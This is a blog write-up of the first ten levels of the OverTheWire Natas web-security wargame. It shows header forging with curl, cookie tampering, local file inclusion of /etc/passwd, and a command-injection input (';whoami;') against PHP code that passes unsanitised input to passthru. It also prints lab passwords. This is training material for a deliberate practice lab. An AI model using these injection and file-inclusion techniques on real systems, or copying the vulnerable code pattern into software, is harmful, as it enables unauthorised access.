---
layout: "post"
title: "OverTheWire Natas Write-up (Part 1)"
date: "2020-10-26 23:15:33"
date_gmt: "2020-10-26 23:15:33"
modified: "2020-10-26 23:15:33"
modified_gmt: "2020-10-26 23:15:33"
slug: "overthewire-natas-write-up-part-1"
author: "brandonshi123"
status: "publish"
type: "post"
original_url: "https://y4y.space/2020/10/26/overthewire-natas-write-up-part-1/"
guid: "http://y4y.space/?p=220"
wordpress_id: 220
parent_id: 0
categories: ["Uncategorized"]
---

{% raw %}
## Introduction

Natas is a web challenge series from OverTheWire.

https://overthewire.org/wargames/natas/

User needs to get password to advance to next level. The password file is located in `/etc/natas_webpass` directory, only the correspond user can read the current and next level's password.

This write up will show the necessary steps to get password.

## Natas 0

Check source code. Right click and select view source or press `CTRL+R`.

## Natas 1

Same as last level, but mouse is disabled, press `CTRL+U` or simply use `curl` command.

## Natas 2

Check source code again.

![](https://y4y.space/wp-content/uploads/2020/10/screenshot-from-2020-10-26-02-21-37.png?w=724)

There is a `files/` directory, go check it out. The password file is in the `users.txt` in `files/`.

## Natas 3

In the source code, comments says something about even Google cannot find it, which implies `robots.txt`, go to `robots.txt` and follow the path and find the password.

## Natas 4

![](https://y4y.space/wp-content/uploads/2020/10/screenshot-from-2020-10-26-02-24-07-1.png?w=549)

With the text, I assume it's going to be `Referer` in HTTP request. Use `curl` command to change it.

```
curl -u "natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ" "http://natas4.natas.labs.overthewire.org/" --referer 'http://natas5.natas.labs.overthewire.org/'
```

Response:

```
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas4", "pass": "Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ" };</script></head>
<body>
<h1>natas4</h1>
<div id="content">

Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
<br/>
<div id="viewsource"><a href="index.php">Refresh page</a></div>
</div>
</body>
</html>
```

## Natas 5

![](https://y4y.space/wp-content/uploads/2020/10/screenshot-from-2020-10-26-02-28-07.png?w=629)

Weird…I am logged in, what does it mean? I poked around and found there is a cookie called `loggedin` which has the value of `0`. `0` usually means false, so let's change it to `1`. P.S. I used a firefox extension called "cookie editor".

The password will be shown once cookie is set.

## Natas 6

![](https://y4y.space/wp-content/uploads/2020/10/screenshot-from-2020-10-26-02-32-44.png?w=666)

Let's view the source code.

```
 <html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas6", "pass": "<censored>" };</script></head>
<body>
<h1>natas6</h1>
<div id="content">

<?

include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>

<form method=post>
Input secret: <input name=secret><br>
<input type=submit name=submit>
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

So it's checking the `secret` value we provide with the native `$secret` variable… but it was not defined? Notice the `include` statement, let's check that file out.

![](https://y4y.space/wp-content/uploads/2020/10/screenshot-from-2020-10-26-02-35-03.png?w=819)

Well, now we have the value, let's submit it and get password.

## Natas 7

![](https://y4y.space/wp-content/uploads/2020/10/screenshot-from-2020-10-26-02-36-43.png?w=683)

There are two hyperlinks, and check the source code we see:

![](https://y4y.space/wp-content/uploads/2020/10/screenshot-from-2020-10-26-02-39-25.png?w=1024)

Whenever I see `?page=xxx` I always check for file inclusion, let's check `/etc/passwd` first as it exists in every Unix system.

![](https://y4y.space/wp-content/uploads/2020/10/screenshot-from-2020-10-26-02-40-48.png?w=1024)

Cool story bro. Now let's get the password since it was mentioned in the source code earlier.

## Natas 8

![](https://y4y.space/wp-content/uploads/2020/10/screenshot-from-2020-10-26-02-42-42.png?w=671)

Source code:

```
 <html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas8", "pass": "<censored>" };</script></head>
<body>
<h1>natas8</h1>
<div id="content">

<?

$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>

<form method=post>
Input secret: <input name=secret><br>
<input type=submit name=submit>
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

A little reverse is needed here. First it takes an input string, base64 encode it, then reverse the result, and convert that to hex.

Then to reverse it, first convert the value back to binary, and reverse it then finally base64 decode it.

Here is the bash one-liner I ran.

```
python -c 'import base64; print base64.b64decode("3d3d516343746d4d6d6c315669563362".decode("hex")[::-1])'
```

Use the result and submit it, get the password.

## Natas 9

![](https://y4y.space/wp-content/uploads/2020/10/screenshot-from-2020-10-26-02-51-15.png?w=634)

Intuition tells me this is about sql injection.

But anyway, let's check the source code.

```
 <html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas9", "pass": "<censored>" };</script></head>
<body>
<h1>natas9</h1>
<div id="content">
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>

Output:
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

And it turns out not to be sql injection, but command injection. The `passthru` function will invoke system commands. The easiest command injection is just add `;` after as it's the command delimiter. Let's try that.

![](https://y4y.space/wp-content/uploads/2020/10/screenshot-from-2020-10-26-03-00-14.png?w=551)

Let me break the command down:

```
grep -i ;whoami; echo dictionary.txt
```

The rest is the usual procedure, get the password and advance to next level.
{% endraw %}
